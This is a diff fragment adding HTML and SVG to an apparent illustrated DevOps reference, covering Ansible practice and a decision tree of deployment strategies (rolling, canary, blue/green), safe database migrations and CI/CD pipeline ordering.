+      <div><h4><span>15</span>Ansible's job</h4><p>Agentless configuration over SSH — only Python on the target. Bare metal, on-premises, network devices, self-managed databases, compliance baselines, and building images.</p></div>
+      <div><h4><span>16</span>Idempotence</h4><p>Modules describe a state ("nginx present"), so a second run changes nothing and reports changed=0. Shell tasks describe actions, so they cannot tell whether anything needed doing.</p></div>
+      <div><h4><span>17</span>Role defaults</h4><p>defaults/ is low precedence and meant to be overridden; vars/ sits near the top. Putting overridable settings in vars/ causes most "why is my variable ignored" confusion.</p></div>
+      <div><h4><span>18</span>Speed settings</h4><p>An SSH round trip per task per host dominates everything. pipelining, a higher forks than the default 5, and smart fact gathering with a cache routinely halve playbook time.</p></div>
+      <div><h4><span>19</span>Immutable images</h4><p>Packer runs the same role to produce a tested image; the launch template changes and the group rolls. Boot-time configuration makes every scale-out depend on a playbook succeeding at the worst moment.</p></div>
+      <div><h4><span>20</span>Control node</h4><p>Holds SSH access with root escalation to the fleet. Run from CI with a dedicated key, pin Galaxy roles, use Vault and no_log, run --check --diff before production, and log every run.</p></div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <b>Creating implies destroying</b>
+    <p>Terraform credentials are usually the most powerful in the organisation, because a role that can create an environment can delete it. Scope the apply role to what the configuration manages, separate roles per environment so a staging apply cannot reach production, and keep the state bucket in an account the pipeline cannot administer.</p>
+  </div>
+</div>
+
+<!-- ══════════════════════ SHEET 7 — CROSSING THE RIVER ══════════════════════ -->
+<div class="sheet" id="a7">
+  <div class="plate">
+    <span class="no">Sheet 7</span>
+    <h2>Crossing the River</h2>
+    <span class="form">Decision tree</span>
+    <span class="cov">Covers · Deployment Strategies · CI CD</span>
+  </div>
+  <p class="thesis">Stops 13 and 14 of sheet 1, and exit B, as a choice. Every strategy is a way of limiting how many users see a bad release and for how long. <strong>The numbers that matter are time to detect and time to revert — a plain rolling deployment with good alarms and a one-command rollback beats an elaborate canary pipeline that has no idea what "healthy" looks like.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 1400 910" role="img" aria-label="A decision tree and its consequences. Top left, three questions: can versions N and N+1 run side by side, is an instant complete rollback needed, and are the metrics good enough to judge N+1; the leaves are recreate, blue/green, rolling and canary, with A/B testing and shadow traffic set aside as not safety mechanisms. Top right, four small charts of the share of traffic on the new version over time for each strategy. Middle left, a canary judged against the stable version on the same window, rolling back or promoting. Middle right, an expand, migrate, contract database change across four releases. Along the bottom, the feedback loop that makes rare releases riskier, the pipeline ordered by how fast each stage can fail against ten- and twenty-minute thresholds, and what must exist before deployment is automated.">
+        <defs>
+          <marker id="r1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--ink)"/></marker>
+          <marker id="r2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+          <marker id="r3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--hazard)"/></marker>
+        </defs>
+
+        <text x="40" y="42" class="s-zone" fill="var(--line)">The decision · pick the simplest strategy your monitoring can actually judge</text>
+
+        <!-- TREE -->
+        <g fill="var(--paper)" stroke="var(--ink)" stroke-width="2"><rect x="300" y="64" width="300" height="44"/><rect x="320" y="150" width="290" height="44"/><rect x="320" y="262" width="290" height="44"/></g>
+        <g class="s-lab" text-anchor="middle"><text x="450" y="91">01 · can N and N+1 run side by side?</text><text x="465" y="177">03 · need an instant, full rollback?</text><text x="465" y="289">05 · metrics good enough to judge N+1?</text></g>
+        <g stroke="var(--ink)" stroke-width="2" fill="none" marker-end="url(#r1)">
+          <path d="M300,86 C200,86 155,100 155,144"/><path d="M450,108 L462,146"/>
+          <path d="M610,172 C700,172 745,190 745,232"/><path d="M465,194 L465,258"/>
+          <path d="M390,306 L312,350"/><path d="M540,306 L545,350"/>
+        </g>
+        <g class="s-lab" font-size="10.5"><text x="216" y="80" fill="var(--hazard)">no</text><text x="466" y="132">yes</text><text x="668" y="164">yes</text><text x="474" y="232">no</text><text x="330" y="330" text-anchor="end">no</text><text x="552" y="330">yes</text></g>
+
+        <rect x="40" y="150" width="230" height="100" fill="var(--z5)" stroke="var(--hazard)" stroke-width="2"/>
+        <text x="52" y="172" class="s-lab">02 · recreate</text>
+        <g class="s-sub" font-size="10.5"><text x="52" y="192">stop all old, start all new:</text><text x="52" y="206">downtime, and simple</text><text x="52" y="220">fine at 3 a.m. for an internal</text><text x="52" y="234">tool — else make N+1 compatible</text></g>
+
+        <rect x="640" y="236" width="210" height="120" fill="var(--z1)" stroke="var(--line)" stroke-width="2"/>
+        <text x="652" y="258" class="s-lab">04 · blue / green</text>
+        <g class="s-sub" font-size="10.5"><text x="652" y="278">two full environments;</text><text x="652" y="292">traffic moves in one step</text><text x="652" y="306">old one stays warm: back</text><text x="652" y="320">in seconds · 2× infra</text></g>
+        <text x="652" y="342" class="s-haz" font-size="10.5">switch at the LB, not DNS</text>
+
+        <rect x="200" y="356" width="220" height="104" fill="var(--z1)" stroke="var(--line)" stroke-width="2.5"/>
+        <text x="212" y="378" class="s-lab">06 · rolling</text>
+        <g class="s-sub" font-size="10.5"><text x="212" y="398">replace a few at a time;</text><text x="212" y="412">N and N+1 coexist</text><text x="212" y="426">health-gated, automatic</text><text x="212" y="440">rollback: most teams' answer</text></g>
+
+        <rect x="440" y="356" width="210" height="104" fill="var(--z4)" stroke="var(--fast)" stroke-width="2.5"/>
+        <text x="452" y="378" class="s-lab">07 · canary</text>
+        <g class="s-sub" font-size="10.5"><text x="452" y="398">5% of real traffic first,</text><text x="452" y="412">compared with N on the</text><text x="452" y="426">same window, then grow</text></g>
+        <text x="452" y="446" class="s-haz" font-size="10.5">no analysis = a slow deploy</text>
+
+        <rect x="670" y="376" width="180" height="94" fill="var(--band)" stroke="var(--rule)"/>
+        <text x="678" y="396" class="s-lab" font-size="11">not safety mechanisms</text>
+        <g class="s-sub" font-size="10"><text x="678" y="414">08 · A/B: a product question</text><text x="678" y="430">09 · shadow: copies traffic,</text><text x="678" y="444">discards replies — suppress</text><text x="678" y="458">emails, payments, writes</text></g>
+
+        <text x="40" y="492" class="s-note" font-size="11">Start rolling. Add canary when you trust the metrics. Use blue/green when a whole environment must revert at once.</text>
+
+        <!-- CHARTS -->
+        <rect x="880" y="56" width="490" height="440" fill="var(--z3)"/>
+        <text x="896" y="78" class="s-zone" fill="var(--mute)">Share of traffic on N+1, over time</text>
+        <g stroke="var(--rule)" stroke-width="1.5">
+          <line x1="916" y1="110" x2="916" y2="220"/><line x1="916" y1="220" x2="1106" y2="220"/>
+          <line x1="1156" y1="110" x2="1156" y2="220"/><line x1="1156" y1="220" x2="1346" y2="220"/>
+          <line x1="916" y1="320" x2="916" y2="430"/><line x1="916" y1="430" x2="1106" y2="430"/>
+          <line x1="1156" y1="320" x2="1156" y2="430"/><line x1="1156" y1="430" x2="1346" y2="430"/>
+        </g>
+        <g class="s-lab" font-size="11"><text x="916" y="102">02 · recreate</text><text x="1156" y="102">06 · rolling</text><text x="916" y="312">04 · blue / green</text><text x="1156" y="312">07 · canary</text></g>
+        <g class="s-num" font-size="9.5" text-anchor="end"><text x="912" y="124">100</text><text x="912" y="222">0</text><text x="1152" y="124">100</text><text x="1152" y="222">0</text><text x="912" y="334">100</text><text x="912" y="432">0</text><text x="1152" y="334">100</text><text x="1152" y="432">0</text></g>
+
+        <rect x="996" y="120" width="30" height="100" fill="var(--hazard)" opacity=".18"/>
+        <path d="M916,120 L996,120" stroke="var(--mute)" stroke-width="2.5" fill="none"/>
+        <path d="M916,220 L996,220 M1026,120 L1106,120" stroke="var(--fast)" stroke-width="3.5" fill="none"/>
+        <text x="1011" y="238" text-anchor="middle" class="s-haz" font-size="10">downtime</text>
+        <text x="1000" y="140" class="s-sub" font-size="9.5" style="fill:var(--hazard)">nobody</text>
+
+        <path d="M1156,220 L1186,220 L1186,195 L1216,195 L1216,170 L1246,170 L1246,145 L1276,145 L1276,120 L1346,120" stroke="var(--fast)" stroke-width="3.5" fill="none"/>
+        <text x="1260" y="200" class="s-sub" font-size="10">both versions</text>
+        <text x="1260" y="212" class="s-sub" font-size="10">live the whole time</text>
+
+        <path d="M916,430 L1000,430 L1000,330 L1106,330" stroke="var(--fast)" stroke-width="3.5" fill="none"/>
+        <path d="M1050,334 L1050,426" stroke="var(--hazard)" stroke-width="2" stroke-dasharray="5 4" fill="none" marker-end="url(#r3)"/>
+        <text x="1004" y="346" class="s-sub" font-size="9.5">cutover</text>
+        <text x="1056" y="404" class="s-haz" font-size="10">switch back</text>
+        <text x="1056" y="416" class="s-sub" font-size="9.5" style="fill:var(--hazard)">in seconds</text>
+
+        <path d="M1156,430 L1176,430 L1176,425 L1226,425 L1226,405 L1256,405 L1256,380 L1286,380 L1286,330 L1346,330" stroke="var(--fast)" stroke-width="3.5" fill="none"/>
+        <path d="M1226,425 L1226,430 L1250,430" stroke="var(--hazard)" stroke-width="2.5" fill="none"/>
+        <text x="1180" y="400" class="s-num" font-size="9.5">5% · 10 min</text>
+        <g class="s-sub" font-size="9.5"><text x="1296" y="374">25 → 50</text><text x="1296" y="386">→ 100</text></g>
+        <text x="1156" y="450" class="s-haz" font-size="10">fails → back on N in 90 s</text>
+        <text x="916" y="450" class="s-sub" font-size="10">time →</text>
+        <text x="896" y="478" class="s-sub" font-size="10.5">Only recreate leaves a gap. Every other shape keeps both</text>
+        <text x="896" y="490" class="s-sub" font-size="10.5">versions live together for a while — which is the catch.</text>
+
+        <!-- CANARY JUDGED -->
+        <rect x="30" y="510" width="660" height="214" fill="var(--z4)"/>
+        <text x="46" y="534" class="s-zone" fill="var(--fast)">10 · a canary, judged properly</text>
+        <rect x="46" y="572" width="96" height="60" fill="var(--paper)" stroke="var(--rule)"/>
+        <text x="56" y="596" class="s-lab" font-size="11">load</text><text x="56" y="610" class="s-lab" font-size="11">balancer</text><text x="56" y="624" class="s-sub" font-size="9.5">or mesh</text>
+        <rect x="180" y="550" width="150" height="44" fill="var(--z1)" stroke="var(--line)" stroke-width="2"/>
+        <rect x="180" y="610" width="150" height="44" fill="var(--paper)" stroke="var(--fast)" stroke-width="2.5"/>
+        <g class="s-lab" font-size="11"><text x="190" y="568">stable · N</text><text x="190" y="628" fill="var(--fast)">canary · N+1</text></g>
+        <g class="s-sub" font-size="10"><text x="190" y="584">10 pods · 95%</text><text x="190" y="644">1 pod · 5%</text></g>
+        <rect x="370" y="560" width="170" height="90" fill="var(--paper)" stroke="var(--line)" stroke-width="2"/>
+        <text x="380" y="578" class="s-lab" font-size="11">compare, same window</text>
+        <g class="s-mono" font-size="9.5"><text x="380" y="598">error rate  N vs N+1</text><text x="380" y="614">p99 latency N vs N+1</text><text x="380" y="630">business metric</text><text x="380" y="644">saturation</text></g>
+        <rect x="560" y="560" width="120" height="40" fill="var(--z5)" stroke="var(--hazard)" stroke-width="2"/>
+        <rect x="560" y="610" width="120" height="40" fill="var(--z1)" stroke="var(--line)" stroke-width="2"/>
+        <g class="s-lab" font-size="10.5"><text x="568" y="577" fill="var(--hazard)">worse →</text><text x="568" y="627" fill="var(--line)">healthy 10 min →</text></g>
+        <g class="s-sub" font-size="10"><text x="568" y="592">auto rollback</text><text x="568" y="642">25 → 50 → 100%</text></g>
+        <g stroke="var(--line)" stroke-width="2" fill="none" marker-end="url(#r2)"><path d="M142,592 L176,574"/><path d="M142,612 L176,630"/><path d="M330,572 L366,590"/><path d="M330,632 L366,620"/><path d="M540,590 L556,582"/><path d="M540,620 L556,628"/></g>
+        <text x="46" y="680" class="s-sub">A fixed threshold fails both ways: 1% errors may be normal at peak and alarming at 3 a.m.</text>
+        <text x="46" y="696" class="s-haz" font-size="10.5">A pricing bug has a perfect error rate. Include business metrics, or the canary is theatre.</text>
+        <text x="46" y="714" class="s-sub">A low-traffic canary needs longer to mean anything · Argo Rollouts and Flagger automate the judgement.</text>
+
+        <!-- MIGRATION -->
+        <rect x="706" y="510" width="664" height="214" fill="var(--z1)"/>
+        <text x="722" y="534" class="s-zone" fill="var(--line)">11 · the migration that cannot roll back</text>
+        <text x="722" y="552" class="s-sub">code rolls back in seconds; a dropped column does not — so removal lags by releases</text>
+        <line x1="760" y1="590" x2="1240" y2="590" stroke="var(--line)" stroke-width="4"/>
+        <g class="st" stroke-width="2.5"><circle cx="760" cy="590" r="8"/><circle cx="920" cy="590" r="8"/><circle cx="1080" cy="590" r="8"/></g>
+        <circle cx="1240" cy="590" r="9" fill="var(--paper)" stroke="var(--hazard)" stroke-width="3"/>
+        <g class="s-lab" font-size="11"><text x="736" y="574">R1 · expand</text><text x="896" y="574">R2 · migrate</text><text x="1056" y="574">R3 · contract</text><text x="1216" y="574" fill="var(--hazard)">R4 · drop</text></g>
+        <g class="s-sub" font-size="10">
+          <text x="736" y="614">add email_verified_at;</text><text x="736" y="628">write both, read old</text>
+          <text x="896" y="614">backfill, then switch</text><text x="896" y="628">reads to the new one</text>
+          <text x="1056" y="614">a week later: stop</text><text x="1056" y="628">writing the old column</text>
+          <text x="1216" y="614">later still:</text><text x="1216" y="628">drop it</text>
+        </g>
+        <rect x="736" y="644" width="480" height="10" fill="var(--line)" opacity=".7"/>
+        <rect x="1216" y="644" width="120" height="10" fill="var(--hazard)" opacity=".6"/>
+        <text x="722" y="674" class="s-note" font-size="11">At every point, rolling back one release is safe. Additive changes always are.</text>
+        <text x="722" y="694" class="s-haz" font-size="10.5">A destructive migration in the same release as the code that needs it makes rollback impossible —</text>
+        <text x="722" y="708" class="s-sub" font-size="10.5" style="fill:var(--hazard)">discovered during the incident. And an ALTER that locks a busy table for 4 minutes is an outage anyway.</text>
+
+        <!-- BOTTOM -->
+        <rect x="30" y="744" width="440" height="156" fill="var(--band)"/>
+        <text x="46" y="766" class="s-zone" fill="var(--hazard)">12 · the loop CI/CD breaks</text>
+        <circle cx="130" cy="830" r="42" fill="none" stroke="var(--hazard)" stroke-width="3" stroke-dasharray="10 6"/>
+        <path d="M168,812 L172,822" stroke="var(--hazard)" stroke-width="3" fill="none"/>
+        <g class="s-lab" font-size="10.5" text-anchor="middle"><text x="130" y="782">rare</text><text x="130" y="888">riskier</text></g>
+        <text x="178" y="834" class="s-lab" font-size="10.5">bigger</text>
+        <text x="82" y="834" text-anchor="end" class="s-lab" font-size="10.5">rarer</text>
+        <g class="s-sub"><text x="250" y="796">Risky releases get rarer,</text><text x="250" y="810">so each is bigger, so riskier.</text><text x="250" y="832">The way out: deploy far more</text><text x="250" y="846">often, in far smaller pieces.</text></g>
+        <text x="250" y="870" class="s-note" font-size="10.5">A 10-line change is easy to</text>
+        <text x="250" y="884" class="s-note" font-size="10.5">review and trivial to undo.</text>
+
+        <rect x="490" y="744" width="440" height="156" fill="var(--z3)"/>
+        <text x="506" y="766" class="s-zone" fill="var(--mute)">13 · order by how fast it fails</text>
+        <g class="s-sub" font-size="10"><text x="506" y="790">lint, format, types</text><text x="506" y="804">unit tests</text><text x="506" y="818">build the artefact</text><text x="506" y="832">deps + secret scan</text><text x="506" y="846">integration tests</text><text x="506" y="860">deploy to staging</text><text x="506" y="874">smoke / end-to-end</text><text x="506" y="888">production</text></g>
+        <g fill="var(--line)" opacity=".8"><rect x="640" y="782" width="6" height="10"/><rect x="646" y="796" width="22" height="10"/><rect x="646" y="810" width="39" height="10"/><rect x="646" y="824" width="11" height="10"/><rect x="685" y="838" width="56" height="10"/><rect x="741" y="852" width="11" height="10"/></g>
+        <g fill="var(--fast)" opacity=".8"><rect x="752" y="866" width="68" height="10"/><rect x="820" y="880" width="11" height="10"/></g>
+        <line x1="752" y1="776" x2="752" y2="896" stroke="var(--fast)" stroke-width="2" stroke-dasharray="4 4"/>
+        <line x1="865" y1="776" x2="865" y2="896" stroke="var(--hazard)" stroke-width="2" stroke-dasharray="4 4"/>
+        <text x="758" y="790" class="s-note" font-size="10">10 min: flow</text>
+        <text x="870" y="790" class="s-haz" font-size="10">20 min</text>
+        <text x="870" y="804" class="s-sub" font-size="9.5" style="fill:var(--hazard)">batching</text>
+
+        <rect x="950" y="744" width="420" height="156" fill="var(--z5)"/>
+        <text x="966" y="766" class="s-zone" fill="var(--fast)">14 · before automating deployment</text>
+        <g class="s-sub"><text x="966" y="788">✓ a health check that reflects readiness, not just a process</text><text x="966" y="804">✓ a rollback that takes ONE action, practised in staging</text><text x="966" y="820">✓ monitoring that would tell you it went wrong</text><text x="966" y="836">✓ backward-compatible migrations as a standing rule</text></g>
+        <text x="966" y="860" class="s-note" font-size="10.5">The fastest rollback is a flag: seconds, no pipeline.</text>
+        <text x="966" y="878" class="s-haz" font-size="10.5">Roll back to a verified artefact — never an unsigned one,</text>
+        <text x="966" y="892" class="s-sub" font-size="10.5" style="fill:var(--hazard)">and never by skipping the controls a normal deploy passes.</text>
+      </svg>
+    </div>
+    <figcaption><b>Crossing a river:</b> recreate is jumping; rolling is stepping stones, so you are briefly on both banks and both must hold your weight; blue/green is a second bridge; canary is sending one person over first and watching. Every one depends on being able to turn round — and the only thing that makes the crossing safe is learning quickly that a stone is loose.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — the choices and their costs</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>Compatibility</h4><p>In any rolling or canary rollout N and N+1 run at once, so both must work with the same schema, queue message shapes, cache entries and API contracts. Most deployment incidents live in that overlap.</p></div>
+      <div><h4><span>02</span>Recreate</h4><p>Stop everything old, start everything new. Downtime, and the simplest possible procedure — sometimes acceptable for an internal tool at 3 a.m.</p></div>
+      <div><h4><span>03</span>Instant full rollback</h4><p>The question that separates blue/green from the rest: must a whole environment revert in one step, rather than instance by instance?</p></div>
+      <div><h4><span>04</span>Blue/green</h4><p>Two full environments; traffic moves in one switch and the old one stays warm. Double infrastructure during the overlap, a shared database that must serve both, connections to drain — and switch at the load balancer, because DNS TTLs make cutover and rollback take hours.</p></div>
+      <div><h4><span>05</span>Trustworthy metrics</h4><p>Canary analysis is only as good as the signals it compares. Without reliable error rate, latency and business metrics — and enough traffic — you are deploying slowly and calling it safety.</p></div>
+      <div><h4><span>06</span>Rolling</h4><p>Replace a few instances at a time, gated by health, with automated rollback on error rate. The default nearly everywhere, and enough for most teams. Keep surge headroom; capacity dips during the roll.</p></div>
+      <div><h4><span>07</span>Canary</h4><p>A small share of real traffic goes to N+1 first, then 25%, 50%, 100% if healthy. The smallest blast radius, provided the judgement is automated.</p></div>
+      <div><h4><span>08</span>A/B testing</h4><p>Routes by user attribute to compare behaviour. It answers a product question, not an operational one, and must not be mistaken for a safety mechanism.</p></div>
+      <div><h4><span>09</span>Shadow traffic</h4><p>Real requests duplicated to N+1 and responses discarded. Tests real load without user impact — and doubles charges and emails unless every side effect is suppressed.</p></div>
+      <div><h4><span>10</span>Canary analysis</h4><p>Compare N+1 against N over the same window, not against a fixed threshold, and include business metrics. Argo Rollouts and Flagger automate the decision a human watching a dashboard would miss.</p></div>
+      <div><h4><span>11</span>Expand, migrate, contract</h4><p>Add the new column and write both; backfill and switch reads; stop writing the old; drop it last. Removals lag additions by at least one release, so rolling back one release is always safe.</p></div>
+      <div><h4><span>12</span>The vicious circle</h4><p>Large rare releases are risky, so teams release less often, which makes each release larger and riskier. The fix is counter-intuitive and the whole argument for CI/CD: smaller, far more often.</p></div>
+      <div><h4><span>13</span>Pipeline order</h4><p>Cheapest, fastest checks first; parallelise anything independent. Under ten minutes people stay in flow; past twenty they context-switch, batch changes and let reviews go stale.</p></div>
+      <div><h4><span>14</span>Reversibility first</h4><p>Health checks, a one-action rollback, monitoring and compatible migrations come before automated deployment. Deployment speed is worth nothing without rollback speed.</p></div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <b>Cold caches and night deploys</b>
+    <p>Replacing every instance at once empties every in-process cache and hands the database the full load — the classic "successful" deployment followed by a latency spike. Roll gradually and warm caches before readiness passes. And deploy during the day: the point of small, reversible releases is that the people who can fix a problem are awake when it happens.</p>
+  </div>
+</div>
+
+</div>
